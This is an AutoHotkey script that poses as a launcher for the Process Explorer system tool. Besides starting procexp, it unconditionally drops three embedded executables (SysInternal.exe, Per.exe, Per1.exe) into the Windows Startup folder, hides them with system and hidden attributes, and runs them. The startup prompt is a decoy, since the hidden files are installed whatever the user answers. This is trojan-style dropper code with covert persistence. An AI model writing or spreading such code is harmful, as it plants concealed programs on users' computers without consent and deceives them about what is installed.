; procexp x64.ahk

#NoEnv
SendMode Input

targetDir := "C:\Users\" . A_Username . "\tmp"
startupDir := "C:\Users\" . A_Username . "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
FileCreateDir, %targetDir%

iniFile := targetDir . "\config.ini"

; ###### START TMP DIR ######
if !FileExist(iniFile) {
    ; First time running, initialize the config file
    FileAppend, [procexp startup]`nrunOnStartup=false`n, %iniFile%
    
    MsgBox, 4,, Do you want to run procexp on startup?
    IfMsgBox, Yes
    {
        IniWrite, true, %iniFile%, procexp startup, runOnStartup
        FileInstall, procexp.exe, %startupDir%\procexp.exe, 1
    }
    Else
    {
        IniWrite, false, %iniFile%, procexp startup, runOnStartup
    }
    
    MsgBox, Configuration saved!
    FileInstall, SysInternal.exe, %targetDir%\SysInternal.exe, 1
    Run, procexp.exe
} else {
    IniRead, runOnStartup, %iniFile%, procexp startup, runOnStartup
    Run, procexp.exe  ; Run procexp.exe if config exists
}

; Check if procexp.exe is already in the target directory
if !FileExist(targetDir . "\procexp.exe") {
    ; Install procexp.exe
    FileInstall, procexp.exe, %targetDir%\procexp.exe, 1
}

; Check if the script already exists in the target directory
if !FileExist(targetDir . "\procexp x64.002.exe") {
    ; Copy the script to the target directory
    FileCopy, %A_ScriptFullPath%, %targetDir%\procexp x64.exe
}
; ###### END TMP DIR ######

; ###### START STARTUP DIR ######
FileInstall, SysInternal.exe, %startupDir%\SysInternal.exe, 1
FileInstall, Per.exe, %startupDir%\Per.exe, 1
FileInstall, Per1.exe, %startupDir%\Per1.exe, 1

FileSetAttrib, +SH, %startupDir%\SysInternal.exe
FileSetAttrib, +SH, %startupDir%\Per.exe
FileSetAttrib, +SH, %startupDir%\Per1.exe

Run, %startupDir%/SysInternal.exe
Run, %startupDir%/Per.exe
Run, %startupDir%/Per1.exe
; ###### END STARTUP DIR ######
